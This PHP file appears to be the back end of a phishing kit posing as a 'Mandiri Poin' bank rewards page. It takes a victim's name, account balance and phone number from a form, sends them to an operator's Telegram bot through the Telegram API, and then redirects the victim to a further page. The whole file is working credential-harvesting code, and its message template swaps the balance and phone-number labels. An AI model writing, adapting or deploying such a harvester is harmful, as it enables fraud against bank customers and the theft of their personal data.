<?php
include "telegram.php";
session_start();

$nama = $_POST['nama'];
$saldo = $_POST['saldo'];
$nohp = $_POST['nohp'];

$_SESSION['nama'] = $nama;
$_SESSION['saldo'] = $saldo;
$_SESSION['nohp'] = $nohp;

$message = "
━─━────༺𝙈𝘼𝙉𝘿𝙄𝙍𝙄-𝙋𝙊𝙄𝙉༻────━─━
├───────────────────
├• 𝗡𝗮𝗺𝗮   :  ".$nama."
├• 𝗦𝗮𝗹𝗱𝗼 :  ".$nohp."
├• 𝗡𝗼𝗺𝗼𝗿  :  ".$saldo."
╰───────────────────
━─━────༺𝙈𝘼𝙉𝘿𝙄𝙍𝙄-𝙋𝙊𝙄𝙉༻────━─━ ";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../one.html');
?>
